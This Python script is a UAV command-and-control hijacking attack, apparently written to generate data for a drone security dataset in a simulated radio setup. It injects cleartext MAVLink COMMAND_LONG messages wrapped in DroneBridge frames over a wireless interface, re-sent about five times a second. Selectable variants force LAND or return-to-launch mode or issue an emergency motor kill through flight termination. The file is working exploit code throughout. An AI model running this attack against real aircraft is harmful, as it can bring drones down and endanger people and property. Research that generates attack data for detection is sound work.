#!/usr/bin/env python3
"""
T10 C2 Hijacking — Take control of UAV via cleartext MAVLink injection.

Since DroneBridge RPi C proxy has no transport encryption, this attack
directly injects MAVLink COMMAND_LONG messages wrapped in valid DroneBridge
frames via wlan2. Variants (--variant), one per dataset mission:
  land       mode change to LAND
  rtl        mode change to RTL
  terminate  emergency motor kill (MAV_CMD_DO_FLIGHTTERMINATION)
  cycle      all three in turn (legacy; flight termination after ~0.4 s
             ends the flight, so LAND/RTL never take visible effect)
The chosen command is re-sent at ~5 Hz for the whole attack duration.

The Comm ID is known (plaintext in DroneBridge header, observed via 
passive monitoring on hwsim0/wlan2).

Expected drone behavior: unauthorized mode changes, unplanned landing
or return-to-launch, motor shutdown.

Usage (standalone test):
    sudo python3 c2_hijacking.py --interface wlan2

Normally started/stopped by the orchestrator.
"""

import argparse
import signal
import struct
import time
import random

keep_running = True

# ArduCopter flight modes
FLTMODE_LAND = 9
FLTMODE_RTL = 6
FLTMODE_BRAKE = 17


def handle_signal(sig, frame):
    global keep_running
    keep_running = False


def build_mavlink_command_long(command, param1=0, param2=0, param3=0,
                                param4=0, param5=0, param6=0, param7=0,
                                target_system=1, target_component=1):
    """Build raw MAVLink v2 COMMAND_LONG message bytes."""
    from pymavlink.dialects.v20 import ardupilotmega as mav

    m = mav.MAVLink(None, srcSystem=255, srcComponent=0)
    msg = m.command_long_encode(
        target_system, target_component,
        command,
        0,  # confirmation
        param1, param2, param3, param4, param5, param6, param7
    )
    return msg.pack(m)


def build_db_frame(payload: bytes, direction=0x01, comm_id=200,
                   port=1, seq_num=0):
    """Wrap payload in a DroneBridge Raw Protocol v2 frame."""
    from scapy.all import RadioTap

    db_header = struct.pack('<4sBBBHB',
        b'\x08\x00\x00\x00',
        direction,
        comm_id,
        port,
        len(payload),
        seq_num & 0xFF
    )
    radiotap = bytes(RadioTap())
    return radiotap + db_header + payload


VARIANTS = ("land", "rtl", "terminate", "cycle")


def run_hijacking(interface: str, variant: str = "cycle"):
    from scapy.all import sendp
    from pymavlink.dialects.v20 import ardupilotmega as mav

    commands = {
        # DO_SET_MODE: param1 = base mode flags, param2 = custom (flight)
        # mode. The flight mode number in param1 (as before 2026-10-08) set
        # custom mode 0 = STABILIZE for LAND (9 has the CUSTOM_MODE_ENABLED
        # bit) and was ignored for RTL (6 has not).
        "land": ("SET_MODE_LAND",
                 build_mavlink_command_long(
                     mav.MAV_CMD_DO_SET_MODE,
                     param1=float(mav.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED),
                     param2=float(FLTMODE_LAND))),
        "rtl": ("SET_MODE_RTL",
                build_mavlink_command_long(
                    mav.MAV_CMD_DO_SET_MODE,
                    param1=float(mav.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED),
                    param2=float(FLTMODE_RTL))),
        "terminate": ("FLIGHT_TERMINATION",
                      build_mavlink_command_long(
                          mav.MAV_CMD_DO_FLIGHTTERMINATION, param1=1.0)),
    }
    if variant == "cycle":
        attack_commands = [commands["land"], commands["rtl"],
                           commands["terminate"]]
    else:
        attack_commands = [commands[variant]]

    seq = random.randint(0, 255)
    frame_count = 0
    cmd_idx = 0

    print(f"[C2_HIJACK] Starting on {interface}, comm_id=200, "
          f"variant={variant}", flush=True)

    while keep_running:
        name, mavlink_bytes = attack_commands[cmd_idx % len(attack_commands)]
        frame = build_db_frame(mavlink_bytes, seq_num=seq)
        sendp(frame, iface=interface, verbose=False, count=1)

        seq = (seq + 1) & 0xFF
        frame_count += 1
        cmd_idx += 1

        if frame_count % 50 == 0:
            print(f"[C2_HIJACK] {frame_count} commands sent "
                  f"(last: {name})", flush=True)

        # ~5 commands per second
        time.sleep(0.2)

    print(f"[C2_HIJACK] Stopped. Total commands: {frame_count}", flush=True)


def main():
    parser = argparse.ArgumentParser(description="T10 C2 Hijacking")
    parser.add_argument("--interface", default="wlan2")
    parser.add_argument("--mission-id", default="manual")
    parser.add_argument("--variant", choices=VARIANTS, default="cycle")
    args = parser.parse_args()

    signal.signal(signal.SIGTERM, handle_signal)
    signal.signal(signal.SIGINT, handle_signal)

    run_hijacking(args.interface, args.variant)


if __name__ == "__main__":
    main()